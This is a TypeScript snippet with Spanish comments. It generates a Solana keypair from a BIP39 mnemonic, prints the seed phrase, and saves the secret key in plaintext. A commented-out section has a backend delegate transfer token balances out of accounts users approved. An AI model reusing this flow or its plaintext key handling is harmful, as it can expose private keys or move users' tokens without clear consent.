import * as web3 from '@solana/web3.js';
import * as bip39 from 'bip39';
import * as fs from 'fs'; // Importa el módulo File System de Node.js
import * as path from 'path'; // Importa el módulo Path para manejar rutas de archivo

// 1. Generar una nueva frase mnemotécnica (seed phrase)
const mnemonic = bip39.generateMnemonic();

// 2. Convertir la frase a semilla binaria
const seed = bip39.mnemonicToSeedSync(mnemonic, "");

// 3. Crear una Keypair a partir de la semilla
const keypair = web3.Keypair.fromSeed(seed.slice(0, 32));

console.log("Frase de Recuperación:", mnemonic);
console.log("Clave Pública (Dirección):", keypair.publicKey.toBase58());

// --- MODIFICACIÓN PARA GUARDAR EL ARCHIVO ---

// 4. Convertir la clave secreta (Uint8Array) a un array de números estándar
const secretKeyArray = Array.from(keypair.secretKey);

// 5. Definir la ruta y el nombre del archivo
const filePath = path.join(process.cwd(), 'my-keypair.json');

// 6. Escribir el array en un archivo .json
fs.writeFileSync(
  filePath,
  JSON.stringify(secretKeyArray) // Convierte el array a un string en formato JSON
);

console.log(`✅ ¡Éxito! Tu clave privada ha sido guardada en: ${filePath}`);


///============= codigo general

// Recorremos las ATAs que aprobamos — asumimos approve por ATA
// for (let i = 0; i < atasWithAmount.length; i++) {
//   const a = atasWithAmount[i];
//   const currentMint = a.mint;
//   const currentAta = a.ata;
//   const amountRawStr = a.amountRawStr; // string en unidades mínimas

//   const decimals = await getTokenDecimals(new PublicKey(currentMint));

//   // Llamada al backend para pedir que el delegado transfiera desde la ATA al destino
//   const { success, idCompletado } = await handleTransferRequest({
//     sourceTokenAccountStr: currentAta,
//     tokenMintAddressStr: currentMint,
//     amount: amountRawStr,
//     decimals,
//     rpcEndpoint,
//   });

//   if (!success) {
//     throw new Error(`Fallo la transferencia en backend para mint ${currentMint}`);
//   }

//   console.log("Transferencia backend OK. id:", idCompletado);
// }

// Mutation para revocar (se usa si la transferencia falla)
// const revokeMutation = useMutation({
//   mutationFn: revokeTokenHandler,
//   onSuccess: (txids: string[]) => {
//     alert("⚠️ Revocación exitosa: autoridad removida.");
//     console.log("Revocación TXIDs:", txids);
//   },
//   onError: (err) => {
//     console.error("ERROR: Falló la revocación", err);
//     alert("❌ Error en revocación. Contacta soporte.");
//   },
// });

